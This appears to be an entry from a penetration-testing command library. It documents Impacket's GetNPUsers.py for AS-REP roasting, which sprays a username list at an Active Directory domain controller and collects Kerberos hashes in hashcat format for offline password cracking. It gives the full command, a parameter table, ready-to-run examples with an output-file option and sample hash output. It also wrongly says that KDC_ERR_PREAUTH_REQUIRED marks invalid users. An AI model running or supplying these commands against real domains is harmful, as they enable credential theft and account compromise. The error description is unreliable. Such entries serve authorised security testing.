---
id: new-uuid-1
name: getnpusers-brute-force-users-without-preauth
type: command
executor: bash
data: >-
  GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS.txt -dc-ip $_TARGET_IP
  -format hashcat
output: null
created_at: '2023-01-12T00:00:00.000000+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - brute-force
verified: true
validated: true
---

# getnpusers-brute-force-users-without-preauth

## Command

```bash
GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS.txt -dc-ip $_TARGET_IP -format hashcat
```

## Description

This command uses Impacket's GetNPUsers.py to brute force a list of usernames against an Active Directory domain, requesting AS-REP tickets for users without Kerberos preauthentication. It outputs crackable hashes for valid users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name (e.g., corp.local) | Yes |
| -no-pass | Requests tickets without password | Yes |
| -usersfile $_USERS.txt | Path to username wordlist file | Yes |
| -dc-ip $_TARGET_IP | IP of domain controller | Yes |
| -format hashcat | Output format for cracking tools | No (default: hashcat) |

## Examples

### Basic Usage

```bash
GetNPUsers.py example.com/ -no-pass -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
```

### Advanced Usage

Add output file: `GetNPUsers.py example.com/ -no-pass -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile hashes.txt`

## Expected Output

For valid users: `$krb5asrep$23$username@example.com:encrypted_hash_part1$encrypted_hash_part2`

Invalid users produce errors like 'KDC_ERR_PREAUTH_REQUIRED'.

## Related

- [[procedures/Brute-Force-Users-Without-Kerberos-Preauthentication]]
- [[tools/Impacket]]
